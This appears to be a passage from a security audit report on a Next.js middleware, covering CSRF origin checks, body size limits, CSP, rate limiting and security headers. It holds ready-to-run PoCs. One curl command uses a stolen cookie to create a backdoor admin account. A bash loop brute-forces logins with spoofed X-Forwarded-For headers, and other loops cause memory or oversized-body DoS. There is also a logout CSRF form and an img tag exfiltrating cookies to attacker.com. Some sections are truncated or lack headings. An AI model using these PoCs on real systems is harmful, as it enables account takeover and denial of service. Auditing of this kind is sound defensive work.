Q5. Is CSRF Origin check bulletproof? (any bypass?)
--------------------------------------------------------------------------------
  ⚠️ NO — src/middleware.ts:157-177  (HIGH for stolen-cookie;
    LOW-MED for browser-mediated)
  Code (lines 157-177):
    const isPublicApi = PUBLIC_API_PREFIXES.some(p => pathname === p || pathname.startsWith(p + "/"));
    if ((method === "POST" || method === "PUT" || method === "DELETE") && !isPublicApi) {
      const origin = req.headers.get("origin");
      const host = req.headers.get("host");
      if (!origin || !host) {
        ... 403 missing_origin ...
      }
      try {
        const originUrl = new URL(origin);
        if (originUrl.host !== host) {
          ... 403 origin_mismatch ...
        }
      } catch {
        ... 403 invalid_origin ...
      }
    }
  Positives:
    - Strict on missing Origin/Host → 403 ✅
    - Uses URL parser to normalize Origin (handles trailing slash,
      case, default ports) ✅
    - Subdomain bypass blocked: Origin "https://evil.victim.com"
      has URL host "evil.victim.com" ≠ "victim.com" → 403 ✅
    - Suffix bypass blocked: Origin "https://victim.com.evil.com"
      has URL host "victim.com.evil.com" ≠ "victim.com" → 403 ✅
    - Browser-mediated CSRF is independently blocked by SameSite=strict
      cookie (login route line 109) ✅
  Bypasses:
    1. SCRIPT-MEDIATED CSRF (HIGH): curl and any HTTP client can set
       BOTH Origin: https://victim.com AND Host: victim.com to any
       value. Middleware cannot distinguish a real browser request
       from a script. Defense relies ENTIRELY on SameSite=strict
       cookie — which DOES NOT protect against stolen-cookie attacks
       (cookie is sent because attacker has it; SameSite only blocks
       cross-site cookie SENDING from a different site's browser
       context).
       Already logged as F-10 / F-NEW-10 in prior audit.
    2. PUBLIC_API_PREFIXES EXEMPTION (MED): any path in the public
       list (middleware.ts:24-37) is fully exempt from the CSRF check.
       The list includes:
         /api/user/login      (OK — public form, no session yet)
         /api/contact         (OK — public form)
         /api/chat            (OK — public form)
         /api/user/logout     (BAD — F-NEW-6/F-24: CSRF-logout
                              clears victim's cookie)
         /api/bale/webhook    (OK — uses HMAC secret, not cookie)
         /api/telegram/webhook (OK — same)
         /api/user/verify     (borderline — POST with no body?)
       The /api/user/logout CSRF is STILL OPEN: a cross-site
       <form action="https://victim.com/api/user/logout" method="POST">
       will clear the victim's access_session cookie. Minor DoS.
    3. CASE MISMATCH (LOW — false-positive, not bypass): URL parser
       lowercases the host portion of Origin, but the Host header is
       sent as-is by the client. If a legit browser sends Host:
       Victim.com (some misconfigured proxies do), the check fails
       and the request is incorrectly rejected.
    4. MISSING Sec-Fetch-Site CHECK (LOW-MED): modern browsers send
       Sec-Fetch-Site: same-origin / cross-site / none. Adding this
       check would close the script-mediated bypass for browser-
       issued requests (though not for non-browser clients).
  Cross-reference: F-10, F-NEW-10, F-24, F-NEW-6 in prior audit
    (all still open).
  Severity: HIGH (stolen-cookie attacks bypass CSRF via spoofed
    Origin/Host; logout-CSRF still open via PUBLIC_API exemption)
  PoC (script-mediated CSRF with stolen cookie):
    # Attacker has stolen access_session cookie (via XSS-sniff, proxy
    # log, referrer leak, etc.). SameSite=strict does NOT block this
    # because the request is made WITH the cookie, not VIA the
    # browser's same-site context.
    curl -s -X POST "https://victim.com/api/admin/users" \
      -H "Origin: https://victim.com" \
      -H "Host: victim.com" \
      -H "Cookie: access_session=<stolen>" \
      -H "Content-Type: application/json" \
      -d '{"username":"backdoor","password":"pwn","role":"admin"}'
    # → 200 OK (Origin matches Host; cookie is valid). Backdoor
    #   admin account created.
  PoC (logout CSRF — public-API exemption):

    <form action="https://victim.com/api/user/logout" method="POST">
      <input type="submit" value="Click me">
    </form>
    # Victim clicks → access_session cookie cleared. Minor DoS.

Q6. Is body size limit (1MB) actually checked?
--------------------------------------------------------------------------------
  ⚠️ WEAK — src/middleware.ts:196-205  (MED)
  Code (lines 196-205):
    if (method === "POST" || method === "PUT" || method === "PATCH") {
      const contentLength = parseInt(req.headers.get("content-length") || "0", 10);
      if (contentLength > 1024 * 1024) { // 1MB limit
        const res = NextResponse.json(
          { ok: false, error: "payload_too_large" },
          { status: 413 }
        );
        return addSecurityHeaders(res);
      }
    }
  Issues:
    1. TRUSTS THE CONTENT-LENGTH HEADER: an attacker controls this
       header. Send `Content-Length: 100` with a 100 MB body —
       middleware sees 100 < 1MB → passes. Next.js's request.json()
       then tries to read 100 MB into memory.
    2. NO TRANSFER-ENCODING: CHUNKED HANDLING: if the attacker omits
       Content-Length entirely and sends `Transfer-Encoding: chunked`,
       parseInt returns 0 → middleware passes. The actual body can be
       gigabytes. (Next.js route handlers do stream the body, but
       request.json() buffers it all into memory.)
    3. DELETE METHOD EXEMPT: DELETE can carry a body (RFC allows it).
       Middleware doesn't check. Today no DELETE route uses a body,
       but fragile.
    4. GET REQUESTS WITH BODY EXEMPT: unusual but possible. Same.
    5. API ROUTES DON'T RE-CHECK: each /api/* route calls
       request.json() / request.text() / request.formData() with no
       length guard. Once middleware is bypassed, nothing stops the
       read.
    6. NEXT.JS BUILT-IN LIMIT NOT TIGHTENED: Next.js App Router has
       no built-in body size limit for plain route handlers (only
       experimental.serverActions.bodySizeLimit applies to server
       actions, default 1 MB). So the only effective limit is the
       OS TCP buffer / reverse proxy (NGINX client_max_body_size
       defaults to 1 MB, but not always configured).
  Severity: MED (DoS vector via oversized body; mitigated if a
    reverse proxy like NGINX enforces client_max_body_size, but not
    guaranteed in all deployments)
  PoC:
    # Lie about Content-Length; send 50MB body via chunked encoding:
    head -c 50000000 /dev/urandom | base64 > /tmp/big.txt
    curl -s -X POST "https://victim.com/api/contact" \
      -H "Content-Type: application/json" \
      -H "Content-Length: 100" \
      -H "Transfer-Encoding: chunked" \
      --data-binary @/tmp/big.txt
    # Middleware: parseInt("100") = 100 < 1MB → passes. /api/contact
    # route tries to JSON-parse 50MB → server OOM or 30s+ CPU burn.

    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' data: https://fonts.gstatic.com;

    connect-src 'self' https://www.google.com https://www.gstatic.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self' https://formsubmit.co;
    frame-ancestors 'none';
  Positives:
    - frame-ancestors 'none' ✅ (blocks all clickjacking)
    - object-src 'none' ✅ (blocks plugins/Flash/Java)
    - base-uri 'self' ✅ (blocks <base> hijack)
    - form-action restricted ✅
    - frame-src INCLUDES reCAPTCHA (google.com + gstatic.com) ✅
    - frame-src INCLUDES Aparat (www.aparat.com + aparat.com) ✅
    - frame-src INCLUDES YouTube (www.youtube.com + youtube.com) ✅
    - frame-src INCLUDES Vimeo (player.vimeo.com) ✅

    1. 'unsafe-inline' AND 'unsafe-eval' in script-src (MED, F-18).
       A single stored-XSS anywhere renders CSP useless for script
       execution. Should use per-request nonces (Next.js supports this
       via generateImportMeta or unstable_noStore).
    2. img-src allows 'https:' (LOW-MED). Any https image is allowed.
       <img src="https://attacker.com/tracker.png?cookie=...">
       exfiltrates data via URL (img loading isn't blocked by CORS).
       Should be a specific allowlist of known image CDNs.
    3. NO upgrade-insecure-requests (LOW). Mixed-content downgrade
       risk on any HTTP-loaded asset.
    4. NO worker-src / manifest-src / media-src / child-src
       (informational — these default to default-src 'self', which
       is fine).
    5. NO report-uri / report-to (informational — CSP failures fail
       silently, no telemetry to detect violations).
    6. CSP IS NOT APPLIED TO ERROR RESPONSES (HIGH — see Q12).
       429/403/401/413 responses lack CSP. If any error path ever
       reflects user input (today none do), inline script would run.
    7. CSP IS NOT APPLIED TO THE /user-dashboard REDIRECT (HIGH —
       see Q12). The 302 to /user-login has no CSP.
    8. YOUTUBE 'youtu.be' (LOW — informational): youtu.be is a URL

    9. connect-src too restrictive (LOW — informational): does not

  Severity: MED (overall — frame-src covers reCAPTCHA + Aparat +

Q9. Can middleware be bypassed via path traversal (e.g., /api/admin/../user/login)?
--------------------------------------------------------------------------------
  ✅ NO — Next.js normalizes URL paths before middleware sees them
  Analysis:
    Next.js's URL parser normalizes /api/admin/../user/login to
    /api/user/login BEFORE the middleware function is invoked. The
    `req.nextUrl.pathname` (line 139) is the normalized path. So:
      - Attacker sends: GET /api/admin/../user/login HTTP/1.1
      - Next.js normalizes: pathname = "/api/user/login"
      - Middleware checks:
          - ADMIN_API_PREFIX ("/api/admin/") startsWith?
            "/api/user/login" → NO (correct — this is a login
            route, not an admin route).
          - RATE_LIMIT_PATHS includes "/api/user/login"? → YES
            → rate limit applies (5/15min). ✅
      - No bypass.
  Edge cases (all safe):
    - URL-encoded traversal: /api/admin/%2e%2e/user/login. Next.js
      treats %2e%2e as URL-decoded to ".." — App Router decodes the
      pathname before normalization. So %2e%2e becomes ".." and the
      path normalizes to /api/user/login → same as above. ✅ No
      bypass.
    - Double encoding: /api/admin/%252e%252e/user/login. The %25
      decodes to %, leaving "%2e%2e" literal — pathname =
      "/api/admin/%2e%2e/user/login" → startsWith "/api/admin/" →
      YES → middleware's session check applies. ✅ (And the route
      handler won't find a route at that literal path → 404.)
    - Backslash traversal: /api/admin/..%2fuser/login. Same
      handling as %2e%2e — decoded and normalized. ✅
    - Case variations: /API/ADMIN/users — Next.js is case-sensitive
      for routing (Linux FS). /API/ADMIN/users → 404. Not a bypass.
    - Trailing dot: /api/admin/users. (Windows) — Next.js on Linux
      doesn't strip trailing dots. Not a bypass on Linux.
    - Matcher regex (line 227) is anchored: paths starting with
      /api/admin are matched. No regex-injection bypass possible.
  Severity: PASS

    const rateLimitMap = new Map<string, { count: number; resetAt: number }>();
    const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 دقیقه

    function checkRateLimit(key: string, max: number): boolean {
      const now = Date.now();
      const entry = rateLimitMap.get(key);
      if (!entry || entry.resetAt < now) {
        rateLimitMap.set(key, { count: 1, resetAt: now + RATE_LIMIT_WINDOW_MS });
        return true;
      }
      if (entry.count >= max) return false;
      entry.count++;
      return true;
    }

    // پاکسازی دوره‌ای برای جلوگیری از نشت حافظه
    if (typeof setInterval !== "undefined") {
      setInterval(() => {
        const now = Date.now();
        for (const [k, v] of rateLimitMap) {
          if (v.resetAt < now) rateLimitMap.delete(k);
        }
      }, 5 * 60 * 1000).unref?.();
    }
  Positives:
    - There IS a periodic sweep every 5 minutes ✅ (better than the
      loginAttempts Map in src/app/api/user/login/route.ts:22 —
      F-25, which has NO sweep at all).
    - .unref?.() prevents the interval from keeping the Node.js
      process alive.
  Negatives:
    1. SWEEP INTERVAL TOO LONG UNDER IP-ROTATION ATTACK (LOW):
       with X-Forwarded-For spoofing (Q11), attacker can generate
       millions of unique keys in seconds. Map grows unbounded
       between 5-min sweeps. At ~100 req/sec with random IPs, that's
       30,000 entries per 5-min window. Each entry ~100 bytes →
       ~3 MB. Not catastrophic but grows with attack duration.
    2. EDGE RUNTIME HAS NO setInterval (MED): on Vercel Edge
       runtime (which middleware may run on), setInterval is
       undefined. The `if (typeof setInterval !== "undefined")`
       guard means the sweep is SKIPPED ENTIRELY on Edge →
       guaranteed memory leak for the lifetime of the Edge worker.
    3. SERVERLESS COLD-STARTS RESET MAP (informational — actually
       a positive side-effect): each cold start wipes rateLimitMap,
       so the leak doesn't accumulate across deployments. But rate
       limits also reset → attacker can force a cold start (by
       simply waiting or by hitting a different region).
    4. UNBOUNDED MAP GROWTH ON A SINGLE WARM INSTANCE: even with
       sweep, between sweeps the Map can grow to OOM if attacker is
       fast enough. Cap on Map size would help.
    5. NO LRU / NO MAX-ENTRIES: Map just grows. Should use an LRU
       cache with a hard cap (e.g., 10,000 entries) and evict
       oldest.
  Cross-reference: F-25 in prior audit (loginAttempts Map in
    /api/user/login/route.ts has NO sweep — still open; middleware's
    rateLimitMap is BETTER but still imperfect).
  Severity: LOW (mitigated by sweep + cold starts; main concern is
    Edge runtime where sweep is silently skipped)
  PoC:
    # Slow memory exhaustion (combine with Q11 X-Forwarded-For
    # spoofing):
    while true; do
      ip="$RANDOM.$RANDOM.$RANDOM.$RANDOM"
      curl -s -o /dev/null "https://victim.com/api/user/login" \
        -H "X-Forwarded-For: $ip" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"x"}'
    done
    # On a single warm Edge worker, Map grows unbounded →
    # eventually OOM. (Mitigated if Vercel recycles workers
    # frequently.)

--------------------------------------------------------------------------------
Q11. Can attacker spoof X-Forwarded-For to bypass rate limit?
--------------------------------------------------------------------------------
  ❌ YES — src/middleware.ts:145-146  (HIGH — F-9 still open)
  Code (lines 145-146):
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
               req.headers.get("x-real-ip") || "unknown";
  Analysis:
    - X-Forwarded-For is taken DIRECTLY from the client's header
      without any validation against a trusted-proxy allowlist.
    - The first comma-separated entry is used as the client IP.
      In a legitimate proxy chain (Cloudflare → origin),
      X-Forwarded-For = "client_ip, cloudflare_ip" and the first
      entry IS the client IP. ✅ correct in that case.
    - BUT: if there is NO proxy in front of Next.js (direct
      exposure), OR a proxy that APPENDS to X-Forwarded-For
      without stripping the client's value (NGINX default with
      $proxy_add_x_forwarded_for), the attacker controls the
      first entry.
    - Cloudflare STRIPS and replaces X-Forwarded-For with the
      true client IP → safe.
    - Vercel's edge layer SETS X-Forwarded-For based on connecting
      IP, but DOES NOT strip client-supplied values → exploitable.
    - The fallback `req.headers.get("x-real-ip")` is similarly
      attacker-controlled (NGINX sets it, but only if configured;
      otherwise it's a client header).
  Impact:
    Rate limit key = `${pathname}:${ip}`. Each unique spoofed IP
    creates a fresh bucket. Attacker sends N requests with N
    different X-Forwarded-For values → gets N×5 login attempts
    per 15 min (effectively unlimited).
  Cross-reference: F-9 in prior audit (still open). Also
    amplifies Q4 (rate limit), Q10 (memory leak), F-5 (admin
    brute-force — though /api/admin/* has no rate limit anyway).
  Severity: HIGH (login brute-force, contact-form spam, chat-flood
    all become unlimited)
  PoC:
    #!/bin/bash
    # Bypass /api/user/login 5/15min rate limit:
    WORDLIST="/usr/share/wordlists/rockyou.txt"
    i=0
    while IFS= read -r pw; do
      i=$((i+1))
      fake_ip="10.0.0.$((i % 256))"   # rotate every request
      curl -s -o /dev/null -w "%{http_code} ${pw}\n" \
        -X POST "https://victim.com/api/user/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: ${fake_ip}" \
        -d "{\"username\":\"admin\",\"password\":\"${pw}\"}"
    done < "$WORDLIST"
    # Every request gets HTTP 200/401 (not 429) — rate limit never
    #   triggers because each request uses a fresh IP bucket.

Q12. Is the response CSP applied to all responses including redirects?
--------------------------------------------------------------------------------
  ❌ NO — src/middleware.ts:98-106, 183, 208-214  (HIGH)
  addSecurityHeaders function (lines 98-106):
    function addSecurityHeaders(res: NextResponse): NextResponse {
      res.headers.set("X-Content-Type-Options", "nosniff");
      res.headers.set("X-Frame-Options", "DENY");
      res.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
      res.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
      res.headers.set("X-XSS-Protection", "0");
      res.headers.set("X-Powered-By", "");
      return res;
    }
  Analysis:
    addSecurityHeaders() sets 6 generic security headers but DOES NOT
    set Content-Security-Policy or Strict-Transport-Security. Those
    two are ONLY set on the final NextResponse.next() (line 209 CSP,
    line 212 HSTS).
  Responses missing CSP and HSTS:
    1. 429 rate-limit response (line 149-154) — calls
       addSecurityHeaders but NOT CSP/HSTS.
    2. 403 missing_origin (line 164-166) — same.
    3. 403 origin_mismatch (line 170-172) — same.
    4. 403 invalid_origin (line 174-176) — same.
    5. 401 unauthorized (line 190-192) — same.
    6. 413 payload_too_large (line 199-204) — same.
    7. 302 redirect to /user-login (line 183) — NextResponse.redirect()
       is returned WITHOUT calling addSecurityHeaders at all. So this
       response has NEITHER CSP, NEITHER HSTS, NEITHER X-Frame-Options,
       NEITHER X-Content-Type-Options, NEITHER Referrer-Policy,
       NEITHER Permissions-Policy. The redirect is the ONLY response
       that loses even the basic 6 headers.
  Severity: HIGH (defense-in-depth broken; CSP missing on 6 of 7
    non-pass-through responses; redirect has zero security headers)
  PoC:
    # Verify CSP missing on 401 (admin route without session):
    curl -sI "https://victim.com/api/admin/users" | grep -i content-security
    # → (empty — no CSP header on the 401 response)
    # Verify CSP missing on 429 (rate-limited response):
    for i in 1 2 3 4 5 6; do
      curl -sI -X POST "https://victim.com/api/user/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"x","password":"y"}'
    done | grep -i content-security
    # → (empty — 429 response has no CSP)
    # Verify ZERO security headers on /user-dashboard redirect:
    curl -sI "https://victim.com/user-dashboard" | grep -iE 'content-security|x-frame|strict-transport|referrer|permissions'
    # → HTTP/2 307
    #   location: /user-login
    #   (NO CSP, NO X-Frame-Options, NO HSTS, NO Referrer-Policy,
    #    NO Permissions-Policy on the 307 redirect)
  Real-world impact:
    - The JSON error responses today contain no user-controlled
      content, so missing CSP is defense-in-depth only.
    - The 307 redirect to /user-login is more concerning: missing
      X-Frame-Options means the redirect response itself COULD be
      framed (though the browser will follow the redirect to
      /user-login which DOES have X-Frame-Options: DENY via its own
      pass-through middleware). Net effect: iframe-embedding the
      redirect itself is not very useful, but the inconsistency is
      a red flag.
    - Missing HSTS on error responses: low impact (HSTS is mainly
      for HTML pages), but inconsistent.

Final verdict:
  Of the 12 audit questions, 3 PASS (Q1, Q2, Q9), 4 FAIL/HIGH (Q3,
  Q5, Q11, Q12), 3 PARTIAL/MED (Q4, Q7, Q8), 1 WEAK/MED (Q6), 1 LOW
  (Q10).
  The middleware's most serious weaknesses are:
    (a) Session validation in middleware is format-only (Q3) — the
        real HMAC check happens at the API layer, so middleware-
        level protection can be bypassed with a forged cookie that
        has the correct shape but a bogus signature. Defense-in-depth
        holds only because every admin route independently calls
        checkAdminAuth/checkAdminSession. The /user-dashboard page
        gate is also bypassable.
    (b) The CSP and HSTS headers are only set on the pass-through
        NextResponse.next() (Q12) — all 6 error responses (429/403/
        401/413) and the /user-dashboard redirect lack CSP, and the
        redirect lacks ALL security headers.
    (c) Rate limiting is effectively unlimited against an attacker
        who controls X-Forwarded-For (Q11), which is trivially
        spoofable on most deployments (except behind Cloudflare).

  Cross-references to prior findings (still open):
    - F-1  (HMAC check missing in middleware)              → Q3
    - F-5  (/api/admin/* not rate-limited)                 → Q4
    - F-9  (X-Forwarded-For trusted blindly)               → Q11
    - F-10 (CSRF Origin check script-bypassable)           → Q5
    - F-18 (CSP unsafe-inline/unsafe-eval)                  → Q7
    - F-24/F-NEW-6 (logout CSRF)                           → Q5
    - F-25 (loginAttempts Map no sweep)                   → Q10 (mitigated
